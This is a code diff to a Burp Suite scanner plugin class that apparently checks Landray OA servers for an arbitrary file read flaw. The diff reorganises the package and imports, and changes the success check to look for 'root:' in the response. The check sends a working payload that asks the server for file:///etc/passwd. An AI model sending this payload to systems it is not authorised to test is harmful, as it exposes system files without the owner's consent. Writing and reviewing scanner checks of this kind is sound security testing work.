@@ -1,11 +1,7 @@
-package burp.vuls;
+package burp.vuls.oa.landray;
 
 import burp.*;
-import burp.impl.VulResult;
 import burp.impl.VulTaskImpl;
-import burp.task.BeanParamInject;
-import burp.task.XssReflect;
-import burp.util.HttpRequestResponseFactory;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.Response;
@@ -36,7 +32,7 @@ public class LandrayOa extends VulTaskImpl {
         String poc_body = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}";
         //新请求
         okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
-        BurpExtender.vulsChecked.add("burp.vuls.LandrayOa" + host + iHttpService.getPort()); //添加检测标记
+        BurpExtender.vulsChecked.add("burp.vuls.oa.landray.LandrayOa" + host + iHttpService.getPort()); //添加检测标记
     }
 }
 
@@ -57,7 +53,7 @@ class LandrayOaCallback implements Callback {
         if (response.isSuccessful()){
             vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
             // 检查响应体是否有内容
-            if (vulTask.ok_respBody.length() > 5) {
+            if (vulTask.ok_respBody.contains("root:")) {
                 vulTask.message = "LandrayOa-RadeAny";
                 vulTask.log(call);
             }
